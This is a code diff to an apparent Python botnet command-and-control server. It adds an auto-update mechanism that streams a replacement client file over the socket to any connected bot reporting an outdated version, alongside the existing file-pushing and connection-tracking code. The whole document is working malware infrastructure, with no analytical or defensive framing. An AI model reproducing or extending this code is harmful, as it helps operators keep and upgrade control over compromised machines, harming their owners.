@@ -1,4 +1,5 @@
-import time
+import importlib
+from distutils.version import LooseVersion
 import json
 from threading import Thread, Condition
 from threading import Lock
@@ -10,6 +11,8 @@ try:
 except:
     import formatsock
 
+
+MIN_CLIENT_VERSION = "0.2"
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
@@ -109,11 +112,13 @@ class BotNet(Thread):
 
 
 class BotServer(Thread):
-    def __init__(self, tcpsock, botnet, socketio):
+    def __init__(self, tcpsock, botnet, socketio, clientfile):
         Thread.__init__(self)
         self.tcpsock = tcpsock
         self.botnet = botnet
         self.socketio = socketio
+        self.clientfile = clientfile
+        self.clientversion = LooseVersion(MIN_CLIENT_VERSION)
 
     def run(self):
         while True:
@@ -124,17 +129,24 @@ class BotServer(Thread):
             host_info = json.loads(msgbytes.decode('UTF-8'))
 
             user = host_info['user'].strip()
-            print("[+] Received connection from {}".format(user))
-            self.botnet.addConnection(user, Bot(clientsock, host_info, self.socketio))
-
-            self.socketio.emit('connection', {'user': user}, namespace='/bot')
-
+            botversion = LooseVersion(host_info['version'])
+            bot = Bot(clientsock, host_info, self.socketio)
+            if botversion < self.clientversion:
+                # Autoupdate
+                print("[*] Updating {} on version {}".format(user,botversion))
+                bot.sendClientFile(open(self.clientfile,'rb'))
+            else:
+                print("[+] Received connection from {}".format(user))
+                self.botnet.addConnection(user, bot)
+                self.socketio.emit('connection', {'user': user}, namespace='/bot')
 
 class Bot:
     FILE_SHARD_SIZE = 4096
     FILE_STREAM = 'fstream'
     FILE_CLOSE = 'fclose'
     FILE_FILENAME = 'fname'
+    CLIENT_STREAM = 'cstream'
+    CLIENT_CLOSE = 'cclose'
 
     def __init__(self, sock, host_info, socketio):
         self.sock = formatsock.FormatSocket(sock)
@@ -165,18 +177,30 @@ class Bot:
 
     def sendFile(self, filename, fileobj):
         # TODO: single worker thread instead of new one?
-        t = Thread(target=self.__sendFileHelper(filename, fileobj))
+        t = Thread(target=self.__sendFileHelper(fileobj, filename))
         t.start()
 
-    def __sendFileHelper(self, filename, fileobj):
+    def sendClientFile(self, fileobj):
+        self.sendFile(None,fileobj)
+
+    def __sendFileHelper(self, fileobj, filename=None):
         with self.botlock:
             dat = fileobj.read(Bot.FILE_SHARD_SIZE)
             if len(dat) > 0:
                 while len(dat) > 0:
                     bytestr = dat.decode('UTF-8')
-                    json_str = json.dumps({Bot.FILE_STREAM:bytestr,Bot.FILE_FILENAME:filename})
+                    if filename:
+                        # Particular file
+                        json_str = json.dumps({Bot.FILE_STREAM:bytestr,Bot.FILE_FILENAME:filename})
+                    else:
+                        # Client file
+                        json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                     self.sock.send(json_str)
                     dat = fileobj.read(Bot.FILE_SHARD_SIZE)
-                json_str = json.dumps({Bot.FILE_CLOSE: filename})
+                if filename:
+                    json_str = json.dumps({Bot.FILE_CLOSE: filename})
+                else:
+                    json_str = json.dumps({Bot.CLIENT_CLOSE: True})
                 self.sock.send(json_str)
+                fileobj.close()
                 # TODO emit file upload success
